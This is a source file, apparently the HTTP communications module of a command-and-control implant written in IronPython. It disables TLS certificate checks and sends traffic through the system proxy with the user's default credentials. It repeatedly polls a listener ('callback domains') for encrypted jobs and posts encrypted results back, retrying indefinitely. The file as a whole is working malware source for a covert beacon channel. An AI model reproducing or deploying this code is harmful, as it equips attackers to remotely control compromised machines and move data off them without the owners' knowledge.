class Response(object):
    def __init__(self, request):
        self.request = request

    @property
    def text(self):
        response = self.request.GetResponse()
        reader = StreamReader(response.GetResponseStream())
        data = reader.ReadToEnd()
        reader.Close()
        response.Close()
        self.request.Abort()
        return data

    @property
    def bytes(self):
        data = None
        response = self.request.GetResponse()
        with MemoryStream() as memstream:
            with response.GetResponseStream() as reader:
                reader.CopyTo(memstream)
                data = memstream.ToArray()
                reader.Close
        response.Close()
        self.request.Abort()
        return data


class Requests(object):
    def __init__(self, verify=False, proxy_aware=True, ssl_versions=SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12):
        self.proxy_aware = proxy_aware
        ServicePointManager.SecurityProtocol = ssl_versions
        if not verify:
            ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback(lambda srvPoint, certificate, chain, errors: True)
        ServicePointManager.Expect100Continue = False

    def post(self, url, payload=None):
        r = WebRequest.Create(url)
        r.ServicePoint.ConnectionLimit = 500
        r.Timeout = 30000
        r.ContentType = "application/octet-stream"
        r.Method = "POST"
        if self.proxy_aware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        if len(payload):
            if type(payload) != Array[Byte]:
                data = Encoding.UTF8.GetBytes(payload)
            else:
                data = payload
            r.ContentLength = data.Length
            with r.GetRequestStream() as requestStream:
                requestStream.Write(data, 0, data.Length)
                requestStream.Close()

        return Response(r)


    def get(self, url):
        r = WebRequest.Create(url)
        r.ServicePoint.ConnectionLimit = 500
        r.Timeout = 30000
        r.ContentType = "application/octet-stream"
        r.Method = "GET"
        if self.proxy_aware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        return Response(r)

class Comms(Serializable):
    def __init__(self, client):
        self.client = client
        self.requests = Requests()
        self.crypto = None

        # Listener URLs
        self.base_url = URL  # This needs to be a tuple of callback domains (eventually)
        self.jobs_url = Uri(urljoin(self.base_url, 'jobs'))

    def key_exchange(self):
        while True:
            try:
                self.crypto = Crypto()
                return
            except Exception as e:
                if DEBUG:
                    print "Error performing key exchange: " + str(e)
                    print_traceback()
            Thread.Sleep(self.client.SLEEP)

    def send_job_results(self, results, job_id):
        self.key_exchange()

        if type(results) == dict:
            results = JavaScriptSerializer().Serialize(results)
        elif hasattr(results, '__serialize__'):
            results = JavaScriptSerializer().Serialize(results.__serialize__())

        encrypted_results = self.crypto.Encrypt(results)
        job_url = Uri(urljoin(self.jobs_url, job_id))

        while True:
            try:
                self.requests.post(job_url, payload=encrypted_results)
                return
            except Exception as e:
                if DEBUG:
                    print "Error performing sending job results: " + str(e)
                    print_traceback()

            Thread.Sleep(self.client.SLEEP)

    def get_job(self):
        self.key_exchange()

        while True:
            try:
                job = self.requests.get(self.jobs_url).bytes
                if len(job):
                    return JavaScriptSerializer().DeserializeObject(
                        Encoding.UTF8.GetString(self.crypto.Decrypt(job)))
                return
            except Exception as e:
                if DEBUG:
                    print "Error performing getting jobs: " + str(e)
                    print_traceback()

            Thread.Sleep(self.client.SLEEP)

    def __str__(self):
        return 'http'

    def __serialize__(self):
        return self.__str__()
